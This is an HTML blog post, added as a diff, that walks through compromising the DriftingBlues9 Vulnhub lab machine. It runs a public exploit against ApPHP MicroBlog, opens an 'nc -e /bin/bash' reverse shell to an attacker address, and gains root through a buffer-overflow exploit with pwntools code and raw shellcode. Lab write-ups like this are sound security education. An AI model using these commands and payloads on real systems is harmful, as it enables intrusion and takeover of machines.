@@ -1,0 +1,196 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vulnhub系列-Driftingblues9 | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
+
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="cve">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Vulnhub系列-Driftingblues9"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Vulnhub系列-Driftingblues9</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/07/18/vulnhubDriftingblues9/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-07-18T13:36:34.000Z">
+          2021-07-18
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><img src="/2021/07/18/vulnhubDriftingblues9/1.jpg" alt></p>
+<a id="more"></a>
+<p>nmap进行端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.114</span><br></pre></td></tr></table></figure>
+<p>发现开放了80，111，60711三个端口，对80端口进行爆破，爆破发现目录INSTALL.txt，访问该文件可以知道网站运行的cms和版本号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; Advanced Power of PHP</span><br><span class="line">&#x2F;&#x2F; ---------------------</span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;www.apphp.com</span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; ApPHP MicroBlog Free</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Version: 1.0.1</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p>没有爆破出其他有价值的内容，搜索一下公开漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues9]</span><br><span class="line">└─$ searchsploit apphp</span><br><span class="line">---------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                    |  Path</span><br><span class="line">---------------------------------- ---------------------------------</span><br><span class="line">ApPHP MicroBlog 1.0.1 - Multiple  | php&#x2F;webapps&#x2F;33030.txt</span><br><span class="line">ApPHP MicroBlog 1.0.1 - Remote Co | php&#x2F;webapps&#x2F;33070.py</span><br><span class="line">ApPHP MicroBlog 1.0.2 - Cross-Sit | php&#x2F;webapps&#x2F;40506.html</span><br><span class="line">ApPHP MicroBlog 1.0.2 - Persisten | php&#x2F;webapps&#x2F;40505.txt</span><br><span class="line">ApPHP MicroCMS 3.9.5 - Cross-Site | php&#x2F;webapps&#x2F;40517.html</span><br><span class="line">ApPHP MicroCMS 3.9.5 - Persistent | php&#x2F;webapps&#x2F;40516.txt</span><br><span class="line">---------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+<p>发现远程命令执行执行漏洞，运行一下该payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;33070.py http:&#x2F;&#x2F;192.168.56.114&#x2F;index.php</span><br></pre></td></tr></table></figure>
+<p>直接使用该payload即可打入命令执行，但是该用户的权限是www-data，查看网站的配置文件include/base.inc.php可以看到数据库配置信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DATABASE CONNECTION INFORMATION</span></span><br><span class="line">define(<span class="string">'DATABASE_HOST'</span>, <span class="string">'localhost'</span>);           <span class="comment">// Database host</span></span><br><span class="line">define(<span class="string">'DATABASE_NAME'</span>, <span class="string">'microblog'</span>);           <span class="comment">// Name of the database to be used</span></span><br><span class="line">define(<span class="string">'DATABASE_USERNAME'</span>, <span class="string">'clapton'</span>); <span class="comment">// User name for access to database</span></span><br><span class="line">define(<span class="string">'DATABASE_PASSWORD'</span>, <span class="string">'yaraklitepe'</span>);<span class="comment">// Password for access to database</span></span><br><span class="line">define(<span class="string">'DB_ENCRYPT_KEY'</span>, <span class="string">'p52plaiqb8'</span>);    <span class="comment">// Database encryption key</span></span><br><span class="line">define(<span class="string">'DB_PREFIX'</span>, <span class="string">'mb101_'</span>);</span><br><span class="line"><span class="comment">// Unique prefix of all table names in the database</span></span><br></pre></td></tr></table></figure>
+<p>查看系统文件发现也存在clapton用户，用数据库的密码进行登录，但是我们的现在反弹的shell没法输入密码，所以我们需要尝试建立一个tty终端:</p>
+<p>先反弹一个shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.56.108 8888</span><br></pre></td></tr></table></figure>
+<p>然后建立一个tty终端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p>然后登录clapton用户，在用户家目录下可以看到user.txt获取第一段flag，还有提示文件note.txt提示接下来要进行栈溢出，家目录下有一个input二进制文件有suid权限，通过该文件可以栈溢出提权，将该文件下载到本机进行调试，查看该文件的安全机制，发现没有开任何的安全机制，但是本机默认开启了ALSR，为了调试方便，所以先关闭该地址空间随机化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0|sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>
+<p>首先定位溢出点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br></pre></td></tr></table></figure>
+<p>然后gdb运行得到的模式字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues9]</span><br><span class="line">└─$ gdb -q .&#x2F;input</span><br><span class="line">Reading symbols from .&#x2F;input...</span><br><span class="line">(No debugging symbols found in .&#x2F;input)</span><br><span class="line">gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br><span class="line">Starting program: &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;driftingblues9&#x2F;input Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure>
+<p>然后程序崩溃之后记下当前地址，计算偏移量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues9]</span><br><span class="line">└─$ msf-pattern_offset -q 0x41376641</span><br><span class="line">[*] Exact match at offset 171</span><br></pre></td></tr></table></figure>
+<p>接下来使用gdb验证偏移量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run $(python2 -c &#39;print &quot;a&quot;*171 + &quot;b&quot;*4 + &quot;\x90&quot;*500&#39;)</span><br></pre></td></tr></table></figure>
+<p>此时程序崩溃时eip执行0x62626262，说明我们的溢出点正确，再查看此时的esp地址作为返回地址，那么编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64', log_level='debug')</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">171</span> + p32(<span class="number">0xffffd351</span>) + <span class="string">b'\x90'</span> * <span class="number">2000</span> + shellcode</span><br><span class="line">p = process([<span class="string">'./input'</span>, payload])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>接下来尝试在服务器上运行，服务器端开启了alsr，我们无法关闭，所以进行爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..10000&#125;;do (.&#x2F;input $(python -c &#39;print &quot;a&quot;*171+&quot;\xb0\xde\xbf\xbf&quot;+&quot;\x90&quot;*500+&quot;jhh&#x2F;&#x2F;&#x2F;sh&#x2F;bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&quot;&#39;)); done;</span><br></pre></td></tr></table></figure>
+<p>在靶机上执行命令即可获取flag，然后再根目录下可以找到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line"></span><br><span class="line">this is the final of driftingblues series. i hope you&#39;ve learned something from them.</span><br><span class="line"></span><br><span class="line">you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english&#x2F;turkish)</span><br><span class="line"></span><br><span class="line">your root flag:</span><br><span class="line"></span><br><span class="line">04D4C1BEC659F1AA15B7AE731CEEDD65</span><br><span class="line"></span><br><span class="line">good luck. ( ͡° ͜ʖ ͡°)</span><br></pre></td></tr></table></figure>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>做这个靶机又帮助我回忆了一下栈溢出的知识，这个系列的靶机至此全部结束。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/vulnhub/">vulnhub</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/cve/">cve</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
